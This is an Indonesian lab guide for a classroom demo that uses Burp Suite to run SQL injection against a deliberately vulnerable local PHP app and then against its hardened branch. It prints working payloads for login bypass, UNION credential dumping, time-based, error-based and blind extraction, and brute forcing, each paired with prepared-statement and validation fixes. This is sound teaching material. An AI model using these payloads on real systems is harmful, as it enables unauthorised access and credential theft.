# Panduan Demo SQL Injection dengan Burp Suite
## Studi Kasus: Sistem Informasi Desa (WebDesa) — Versi Non-Secure vs Secure

**Target 1 (Non-Secure):** `master` branch — PHP Native + mysqli raw query
**Target 2 (Secure):** `secure-v2` branch — PHP Native + mysqli prepared statement + hardening
**Tools:** Burp Suite (Proxy, Repeater, Intruder, Comparer) + Browser
**Database:** `webdesa` (non-secure) / `webdesa_secure` (secure)
**Format demo:** Serang non-secure (BERHASIL) → serang secure dgn payload SAMA PERSIS (GAGAL) → jelaskan MENGAPA

---

## 0. Etika & Ruang Lingkup

- Seluruh pengujian HANYA di localhost sendiri. Jangan deploy ke publik.
- Data warga adalah data dummy/fiktif.
- Tujuan: edukasi — dampak SQL Injection dan efektivitas mitigasi.

---

## 1. Koreksi Teknis — Jumlah Kolom (Verified dari Schema)

> Dokumentasi lama (`docs/*.md`) banyak pakai jumlah kolom SALAH. Panduan ini sudah diverifikasi dari `database/schema.sql`.

### Tabel Kolom Terverifikasi

| Query SELECT * dari | Kolom | ORDER BY max |
|---|---|---|
| `warga` | **13** | ORDER BY 13 OK, 14 ERROR |
| `berita` | **6** | ORDER BY 6 OK, 7 ERROR |
| `surat_pengajuan` | **12** | ORDER BY 12 OK, 13 ERROR |
| `users` | **6** | ORDER BY 6 OK, 7 ERROR |
| `riwayat.php` (sp.* + w.nama) | **13** | ORDER BY 13 OK, 14 ERROR |
| `admin/surat.php` (3 tabel JOIN) | **15** | ORDER BY 15 OK, 16 ERROR |

### Cara Verifikasi Sendiri (WAJIB saat demo)

```
# cek_warga.php — warga = 13 kolom
nik: ' ORDER BY 13-- -   → OK (data tdk ditemukan, tdk error)
nik: ' ORDER BY 14-- -   → ERROR

# berita_detail.php — berita = 6 kolom
?id=1 ORDER BY 6-- -    → OK
?id=1 ORDER BY 7-- -    → ERROR
```

---

## 2. Persiapan Lab

### 2.1 Setup Folder & Database

```
htdocs/
├── webdesa/         ← branch master (NON-SECURE)
└── webdesa-secure/   ← branch secure-v2 (SECURE)
```

```bash
# NON-SECURE
git checkout master
cp -r webdesa/ /path/xampp/htdocs/webdesa/
mysql -u root -e "CREATE DATABASE webdesa"
mysql -u root webdesa < database/schema.sql
mysql -u root webdesa < database/dummy_data.sql

# SECURE
git checkout secure-v2
cp -r webdesa/ /path/xampp/htdocs/webdesa-secure/
# Edit config/database.php: 'webdesa' -> 'webdesa_secure'
# Edit config/constants.php: BASE_URL -> /webdesa-secure/
mysql -u root -e "CREATE DATABASE webdesa_secure"
mysql -u root webdesa_secure < database/schema.sql
mysql -u root webdesa_secure < database/dummy_data.sql
```

### 2.2 Akun Login

| Versi | Username | Password | URL Login |
|-------|----------|----------|-----------|
| Non-Secure | admin | admin123 | /webdesa/admin/login.php |
| Secure | admin | admin123 | /webdesa-secure/admin/login.php |

### 2.3 Setup Burp Suite

| # | Aksi |
|---|------|
| 1 | Burp -> Proxy -> Proxy settings -> listener 127.0.0.1:8080 |
| 2 | Browser -> set proxy manual 127.0.0.1:8080 |
| 3 | Proxy -> Intercept -> OFF (hidupkan hanya saat intercept) |

### 2.4 Burp Shortcuts

| Shortcut | Fungsi | Skenario |
|----------|--------|----------|
| Ctrl+R | Send to Repeater | 1, 2, 3, 4 |
| Ctrl+I | Send to Intruder | 5 |
| Ctrl+Shift+R | Send to Comparer | 6 |
| Ctrl+U | URL-encode selection | Semua |
| Space (intercept on) | Forward request | Semua |

---

## 3. Peta 13 Titik Injeksi

| # | File | Param | Method | Non-Secure (query) | Secure (mitigasi) |
|---|------|-------|--------|--------------------|-------------------|
| 1 | cek_warga.php | nik | POST | WHERE nik = '$nik' | Regex 16 digit + prepared stmt |
| 2 | ajukan_surat.php(step1) | nik | POST | WHERE nik = '$nik' | Sama #1 |
| 3 | ajukan_surat.php(step3) | warga_id,dll | POST | INSERT INTO VALUES | Prepared stmt + whitelist |
| 4 | riwayat.php | nik | POST | WHERE w.nik = '$nik' JOIN | Regex + prepared stmt |
| 5 | berita_detail.php | id | GET | WHERE id = '$id' | FILTER_VALIDATE_INT |
| 6 | berita_detail.php(sidebar) | id | GET | WHERE id != '$id' | FILTER_VALIDATE_INT |
| 7 | admin/login.php | username,pass | POST | WHERE u='$u' AND p='$p' | Prepared stmt + bcrypt + rate limit |
| 8 | admin/warga.php | q | GET | WHERE nama LIKE '%$q%' | Prepared stmt |
| 9 | admin/warga.php | hapus | GET | DELETE WHERE id='$id' | FILTER_VALIDATE_INT |
| 10 | admin/warga.php | form fields | POST | INSERT INTO VALUES | Prepared stmt |
| 11 | admin/surat.php | status | GET | WHERE status = '$status' | Whitelist in_array() |
| 12 | admin/surat.php | form fields | POST | UPDATE SET status='$val' | Prepared stmt |
| 13 | admin/berita.php | hapus/toggle | GET | DELETE/UPDATE WHERE id='$id' | FILTER_VALIDATE_INT |

---

## 4. Skenario Demo

### Skenario 1: Login Bypass

**Target:** admin/login.php | POST | username, password

#### 1A. Non-Secure — HARUS BERHASIL

**Langkah:**

| # | Aksi | Expected |
|---|------|----------|
| 1 | Buka http://localhost/webdesa/admin/login.php | Halaman login |
| 2 | Burp -> Intercept ON | Status: Intercept is on |
| 3 | Browser: username=apaaja, password=apaaja, klik Login | Request tertangkap |
| 4 | Raw HTTP: POST /webdesa/admin/login.php ... username=apaaja&password=apaaja | |
| 5 | Klik kanan -> Send to Repeater (Ctrl+R) | Tab Repeater |
| 6 | Ubah body: username=admin'-- -&password=x | |
| 7 | Klik Send | |
| 8 | Cek response: 302 Redirect atau Location: dashboard.php | ✅ MASUK DASHBOARD |

**Penjelasan Query:**

```
SELECT * FROM users WHERE username = '$username' AND password = '$password'

Setelah injeksi:
SELECT * FROM users WHERE username = 'admin'-- -' AND password = 'x'
                                       ^^^^^^^^
                                       -- - = comment SQL -> hapus sisanya

Efektif: SELECT * FROM users WHERE username = 'admin'
```

**Payload alternatif:**
- username: `' OR 1=1-- -`  password: apaaja
- username: `' OR '1'='1'-- -`  password: apaaja

#### 1B. Secure — Payload SAMA -> GAGAL

| # | Aksi | Response | Mengapa |
|---|------|----------|---------|
| 1 | Buka webdesa-secure/admin/login.php | Halaman login | |
| 2 | Intercept: username=admin'-- -&password=x | | |
| 3 | Send to Repeater, Send | 200 OK, tetap di login ❌ | Prepared stmt: admin'-- - = string literal |
| 4 | Body: "Username atau password salah." | ✅ Muncul | Tdk ada user bernama admin'-- - |

**Kode Pembeda:**

```php
// NON-SECURE (master)
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
// -> string concatenation -> SQLi BERHASIL

// SECURE (secure-v2)
$result = db_query($conn,
    "SELECT id, username, password, nama_lengkap, role FROM users WHERE username = ?",
    "s", $username
);
$user = mysqli_fetch_assoc($result);
if ($user && password_verify($password, $user['password'])) {
    // login berhasil
}
// -> prepared stmt: ? = placeholder data
// -> 'admin'-- -' dicari literal -> tdk ditemukan -> gagal
```

**Detection Indicators:**
- Non-Secure: 302 Redirect, Location: dashboard.php
- Secure: 200 OK, body: "Username atau password salah"

---

### Skenario 2: UNION-Based Data Extraction (Dump Kredensial)

**Target:** cek_warga.php | POST | nik

#### 2A. Non-Secure

**Step 1 — Verifikasi Jumlah Kolom (ORDER BY):**

| # | Payload | Expected |
|---|---------|----------|
| 1 | Intercept POST ke cek_warga.php -> Repeater | |
| 2 | nik=' ORDER BY 13-- - | ✅ "NIK tidak terdaftar" (tdk error) |
| 3 | nik=' ORDER BY 14-- - | ❌ Error: Unknown column '14' |
| **=> warga = 13 kolom** | | |

**Raw HTTP Request (ORDER BY):**
```
POST /webdesa/cek_warga.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

nik=' ORDER BY 13-- -
```

**Step 2 — Identifikasi Kolom yang Tampil:**
```
nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
```
Kolom 3 (nama) dan 7 (alamat) biasanya tampil.

**Step 3 — Extract Info Database:**
```
nik=' UNION SELECT 1,2,version(),4,5,6,database(),8,9,10,11,12,13-- -
```
Field Nama -> versi MySQL. Field Alamat -> nama database.

**Step 4 — Enumerasi Tabel:**
```
nik=' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.tables WHERE table_schema=database()-- -
```
Hasil: users,warga,surat_pengajuan,berita

**Step 5 — Enumerasi Kolom Users:**
```
nik=' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name='users'-- -
```
Hasil: id,username,password,nama_lengkap,role,created_at

**Step 6 — DUMP KREDENSIAL (Payload Utama Demo):**
```
nik=' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM users-- -
```

**Expected Response:**
```
admin:admin123
petugas1:petugas123
```

✅ Username + password semua akun didapat dalam 1 request, tanpa login!

**Troubleshooting:**
| Error | Fix |
|-------|-----|
| "different number of columns" | Cek ORDER BY dulu (Step 1) |
| GROUP_CONCAT error | Nama tabel salah, cek Step 4 |

#### 2B. Secure — Payload SAMA -> GAGAL

| # | Payload | Expected | Mengapa |
|---|---------|----------|---------|
| 1 | nik=' ORDER BY 13-- - | ❌ "NIK harus 16 digit angka." | Regex ^\d{16}$ tolak ' , spasi, -- |
| 2 | nik=' UNION SELECT... | ❌ Sama | Non-digit |
| 3 | nik=3273010101000001 (16 digit) | ✅ Data warga tampil | Lolos regex + prepared stmt |

**Kode Pembeda:**
```php
// SECURE
function validate_nik($nik) {
    return preg_match('/^\d{16}$/', $nik);
    // -> ' ORDER BY 13-- -' = 0 (false)
}

if (!validate_nik($nik)) {
    $error = "NIK harus 16 digit angka.";
    // Payload TIDAK PERNAH sampai DB
} else {
    $result = db_query($conn, "SELECT ... FROM warga WHERE nik = ?", "s", $nik);
}
```

---

### Skenario 3: GET-Based Error/Time-Based Injection

**Target:** berita_detail.php?id= | Method: GET

#### 3A. Non-Secure

| # | URL | Expected | Teknik |
|---|-----|----------|--------|
| 1 | ?id=1 | Berita tampil | Baseline |
| 2 | ?id=1 AND SLEEP(5)-- - | **Delay ~5 detik** | **Time-based blind SQLi** confirmed |
| 3 | ?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- - | **Error: XPATH syntax: '~8.0.30~'** | **Error-based extraction** |
| 4 | ?id=-1 UNION SELECT 1,2,3,4,5,6-- - | UNION berhasil (berita=6 kolom) | UNION-based |
| 5 | ?id=1 AND 1=1-- - | Halaman normal | Boolean true |
| 6 | ?id=1 AND 1=2-- - | "Berita tidak ditemukan" | Boolean false |

**Ciri di Burp Repeater:** Kolom Response Time ~5000ms untuk SLEEP(5).

**Dump password via error-based:**
```
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e))-- -
```
Expected: Error `XPATH: '~admin:admin123,petugas1:petugas123~'`

#### 3B. Secure — Payload SAMA -> GAGAL

| # | URL | master | secure-v2 | Mengapa |
|---|-----|--------|-----------|---------|
| 1 | ?id=1 | ✅ Berita | ✅ Berita | Normal |
| 2 | ?id=1 AND SLEEP(5)-- - | ✅ Delay 5s | ❌ **404 instan** | FILTER_VALIDATE_INT |
| 3 | ?id=-1 UNION SELECT 1,2,3,4,5,6-- - | ✅ UNION | ❌ **404** | Sama |
| 4 | ?id=1' | ✅ Error syntax | ❌ **404** | Sama |

**Response Time Comparison (tunjukkan di Burp):**
| Payload | master | secure-v2 |
|---------|--------|-----------|
| ?id=1 | 80ms | 75ms |
| ?id=1 AND SLEEP(5)-- - | **5021ms** | **82ms** (instan!) |

**Kode Pembeda:**
```php
// SECURE
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
// "1 AND SLEEP(5)" -> null -> bukan integer
if (!$id || $id < 1) {
    http_response_code(404);
    die("Halaman tidak ditemukan.");
    // Request BERHENTI di sini. Query TIDAK PERNAH dijalankan.
}

// NON-SECURE
// $id = $_GET['id']; -> string apapun diterima
// $sql = "SELECT * FROM berita WHERE id = '$id'";
// -> langsung dieksekusi -> SQLi berhasil
```

---

### Skenario 4: Search Admin via GET

**Target:** admin/warga.php?q= | GET | **Prasyarat:** Login admin

#### 4A. Non-Secure
```
http://localhost/webdesa/admin/warga.php?q=' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM users-- -
```
✅ Tabel menampilkan admin:admin123 di kolom Nama.

**Mengapa:**
```php
// NON-SECURE
$sql = "SELECT * FROM warga WHERE nama LIKE '%$search%' OR nik LIKE '%$search%'";
// -> UNION menambahkan baris hasil FROM users ke hasil SELECT warga
```

#### 4B. Secure
```
http://localhost/webdesa-secure/admin/warga.php?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
```
❌ Tabel kosong.

```php
// SECURE
$search_param = "%{$search}%"; // "%' UNION SELECT...-- -%"
$result = db_query($conn,
    "SELECT ... FROM warga WHERE nama LIKE ? OR nik LIKE ?",
    "ss", $search_param, $search_param
);
// -> MySQL cari warga dgn nama literal "%' UNION SELECT...%"
// -> tdk cocok -> 0 baris -> aman
```

---

### Skenario 5: Brute Force via Burp Intruder

**Target:** admin/login.php | Tools: Burp Intruder

#### 5A. Non-Secure — Unlimited

**Konfigurasi Intruder:**
| # | Aksi |
|---|------|
| 1 | Intercept login -> Send to Intruder (Ctrl+I) |
| 2 | Positions -> Clear $ -> select password -> Add $ |
| 3 | Payloads -> Simple list -> 20 password salah |
| 4 | Resource pool -> Max concurrent: 1 (WAJIB sequential) |
| 5 | Start attack |

**Expected:** Semua 20 percobaan 200 OK, tidak ada blokir.

#### 5B. Secure — Diblokir Setelah 5x

**Expected Results:**
| Percobaan ke- | Response Body |
|---------------|---------------|
| 1-5 | "Username atau password salah." |
| 6+ | "Terlalu banyak percobaan login. Coba lagi dalam 15 menit." ❌ DIBLOKIR |

Bahkan password BENAR `admin123` pun tetap diblokir sampai 15 menit.

**Kode Pembeda:**
```php
// SECURE
function check_rate_limit($conn, $ip) {
    $window = date('Y-m-d H:i:s', strtotime('-15 minutes'));
    $result = db_query($conn,
        "SELECT COUNT(*) as cnt FROM login_attempts WHERE ip_address = ? AND attempted_at > ?",
        "ss", $ip, $window
    );
    $row = mysqli_fetch_assoc($result);
    return $row['cnt'] >= 5; // >= 5 = blokir
}
// Tabel login_attempts TIDAK ADA di non-secure
```

---

### Skenario 6: Blind SQL Injection (Boolean-Based)

**Target:** cek_warga.php | Tool: Burp Comparer

#### 6A. Non-Secure

**Setup Comparer:**
| # | Aksi |
|---|------|
| 1 | nik=' AND 1=1-- - -> Repeater -> Send -> Response A |
| 2 | nik=' AND 1=2-- - -> Repeater -> Send -> Response B |
| 3 | Select A -> Send to Comparer (Ctrl+Shift+R) |
| 4 | Select B -> Send to Comparer |
| 5 | Tab Comparer -> Words atau Bytes |

**Expected:**
| Payload | Response | Kesimpulan |
|---------|----------|------------|
| ' AND 1=1-- - | "Data Ditemukan" | TRUE |
| ' AND 1=2-- - | "NIK tidak terdaftar" | FALSE |

**Blind extraction:**
```
# Panjang password admin
nik=' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=8-- -
TRUE -> password admin = 8 karakter

# Tebak password per karakter
nik=' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'-- -
TRUE -> karakter ke-1 = 'a'
```

#### 6B. Secure -> GAGAL
| Payload | Response |
|---------|----------|
| ' AND 1=1-- - | ❌ "NIK harus 16 digit angka." |
| ' AND SUBSTRING(...) | ❌ Sama |

---

### Skenario 7: Filter Status Surat

**Target:** admin/surat.php?status= | **Prasyarat:** Login admin

#### 7A. Non-Secure
```
?status=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -
```
✅ Tabel menampilkan data UNION (15 kolom = JOIN 3 tabel)

#### 7B. Secure
```
?status=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- -
```
❌ Status di-reset ke kosong -> tampil data normal (aman).

```php
$allowed_status = ['menunggu','diproses','selesai','ditolak',''];
$status = $_GET['status'] ?? '';
if (!in_array($status, $allowed_status)) {
    $status = ''; // Payload UNION tdk ada di array -> default
}
```

---

### Skenario 8: CSRF Protection

#### Non-Secure
POST /webdesa/cek_warga.php dgn `nik=xxx` -> ✅ langsung diproses.

#### Secure
POST /webdesa-secure/cek_warga.php dgn `nik=xxx` -> ❌ "Request tidak valid."

**Solusi di Burp:** Ambil CSRF token dari response HTML:
```html
<input type="hidden" name="csrf_token" value="a1b2c3...">
```
Lalu kirim ulang: `nik=3273010101000001&csrf_token=a1b2c3...`

---

### Skenario 9: Error Information Disclosure

#### Non-Secure
?id=1' -> ✅ Error: "You have an error in your SQL syntax..."
-> Info sensitif bocor: struktur query, tipe DB

#### Secure
?id=1' -> ❌ 404 Not Found. Tidak ada info teknis.
```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT); // null -> 404
```

---

## 5. Tabel Perbandingan — Semua Serangan

| No | Skenario | Payload | master | secure-v2 | Layer |
|----|---------|---------|--------|-----------|-------|
| 1 | Login bypass | admin'-- - | ✅ Berhasil | ❌ "salah" | Prepared stmt |
| 2 | Dump kredensial | UNION SELECT ... FROM users | ✅ admin:admin123 | ❌ "NIK harus 16 digit" | Regex validasi |
| 3 | Time-based | SLEEP(5) | ✅ Delay 5s | ❌ 404 instan | FILTER_VALIDATE_INT |
| 4 | Error-based | EXTRACTVALUE | ✅ Versi bocor | ❌ 404 | FILTER_VALIDATE_INT |
| 5 | Search admin | ?q=' UNION SELECT... | ✅ Data bocor | ❌ Tabel kosong | Prepared stmt |
| 6 | Brute force | 6x percobaan | ✅ Tdk ada blokir | ❌ Diblokir ke-6 | Rate limit |
| 7 | Filter status | ?status=' UNION... | ✅ Data bocor | ❌ Default value | Whitelist |
| 8 | Boolean blind | ' AND 1=1-- | ✅ TRUE/FALSE | ❌ "NIK harus 16 digit" | Regex |
| 9 | CSRF | POST tanpa token | ✅ Diproses | ❌ "Invalid" | Token per sesi |
| 10 | Error disclosure | id=1' | ✅ Stack trace | ❌ 404 | FILTER_VALIDATE_INT |

---

## 6. Ringkasan Mitigasi (Defense in Depth)

| Layer | Teknik | File | Cegah |
|-------|--------|------|-------|
| 1 | Regex NIK 16 digit | security.php:56 | Payload via nik |
| 2 | FILTER_VALIDATE_INT | berita_detail.php:6 | SQLi via integer |
| 3 | Whitelist in_array() | admin/surat.php:13 | SQLi via enum |
| 4 | Prepared statement db_query() | security.php:4 | SQLi yg lolos validasi |
| 5 | password_verify() bcrypt | admin/login.php:31 | Login bypass |
| 6 | Rate limiting login_attempts | security.php:20 | Brute force |
| 7 | e() = htmlspecialchars() | security.php:13 | XSS |
| 8 | CSRF token per sesi | security.php:40 | Cross-site req forgery |
| 9 | Session httponly+samesite | security.php:61 | Session fixation |
| 10 | X-Frame-Options, nosniff | security.php:70 | Clickjacking |

**Pesan Utama:**
SQL Injection tidak ditutup satu jurus sakti, tapi dengan **defense in depth**: validasi input tolak payload salah format, prepared statement buat DB tdk baca SQL sbg instruksi, bcrypt + rate limit + CSRF tutup celah lain.

---

## 7. Skrip Demo Cepat (5 Menit)

```
===== BUKA DUA TAB BROWSER =====
Tab 1: http://localhost/webdesa/           (NON-SECURE)
Tab 2: http://localhost/webdesa-secure/     (SECURE)

===== 1. LOGIN BYPASS =====
Tab 1: webdesa/admin/login.php
       username: admin'-- -    password: x
       -> ✅ MASUK DASHBOARD!

Tab 2: webdesa-secure/admin/login.php
       PAYLOAD SAMA
       -> ❌ "Username atau password salah"

===== 2. DUMP KREDENSIAL =====
Tab 1: webdesa/cek_warga.php
       nik: ' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),4,5,6,7,8,9,10,11,12,13 FROM users-- -
       -> ✅ admin:admin123 muncul!

Tab 2: webdesa-secure/cek_warga.php
       PAYLOAD SAMA
       -> ❌ "NIK harus 16 digit angka"

===== 3. TIME-BASED =====
Tab 1: webdesa/berita_detail.php?id=1' AND SLEEP(5)-- -
       -> ✅ Loading... 5 detik... halaman muncul

Tab 2: webdesa-secure/berita_detail.php?id=1' AND SLEEP(5)-- -
       -> ❌ 404 Not Found, INSTAN

===== 4. BRUTE FORCE (Burp Intruder) =====
Tab 1: webdesa/admin/login.php -- Intruder 6x percobaan
       -> ✅ Semua diproses, tdk ada blokir

Tab 2: webdesa-secure/admin/login.php -- Intruder 6x percobaan
       -> ❌ Percobaan ke-6: "Terlalu banyak percobaan login."

===== 5. TUTUP =====
"Semua serangan yg BERHASIL di non-secure, GAGAL total di secure.
 Prepared statement + validasi input + bcrypt + rate limit = defense in depth."
```

---

## 8. Daftar Dokumen Terkait

### Di Branch master (Non-Secure)
| File | Isi |
|------|-----|
| docs/non-secure.md | Panduan serangan panjang (non-secure) |
| docs/injection_points.md | 13 titik injeksi + baris kode |
| docs/code_analysis.md | Arsitektur, alur, skema DB |
| docs/burp_guide.md | Tutorial Burp Suite umum |
| docs/sample_payloads.md | Kumpulan payload (kolom terkoreksi) |
| docs/quick_reference.md | Cheatsheet payload + kolom |
| PRD_WebDesa_SQLi_Lab.md | Spesifikasi non-secure |

### Di Branch secure-v2 (Secure)
| File | Isi |
|------|-----|
| docs/secure.md | Semua serangan GAGAL + kode pembeda |
| docs/injection_points.md | Titik injeksi (sudah ditutup) |
| docs/code_analysis.md | Arsitektur + mitigasi |
| docs/quick_reference.md | Kolom terverifikasi |
| PRD_WebDesa_Secure.md | Spesifikasi secure |
